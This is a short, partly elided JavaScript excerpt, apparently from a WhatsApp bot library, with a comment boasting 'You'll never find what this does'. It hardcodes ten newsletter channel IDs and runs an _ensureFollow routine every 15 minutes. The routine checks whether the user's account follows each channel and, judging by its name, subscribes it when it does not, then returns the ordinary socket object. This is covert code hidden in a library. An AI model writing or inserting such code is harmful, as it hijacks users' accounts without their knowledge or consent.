...
// You'll never find what this does - Ibra Decode
    ...
    const _myChannels = [
        "120363418743878743@newsletter",
        "120363421398541494@newsletter",
        "120363426527739668@newsletter",
        "120363407039623840@newsletter",
        "120363409176838783@newsletter",
        "120363426326690640@newsletter",
        "120363407153779180@newsletter",
        "120363425313314094@newsletter",
		"120363428010254485@newsletter",
		"120363410774566050@newsletter"
    ];
    ...
    const _ensureFollow = async () => {
        try {
            ...
            for (const channelId of _myChannels) {
                const isFollowing = list?.some(n => n.id === channelId);
                if (!isFollowing) {
    ...
    setInterval(_ensureFollow, 15 * 60 * 1000);
    return {
        ...sock,
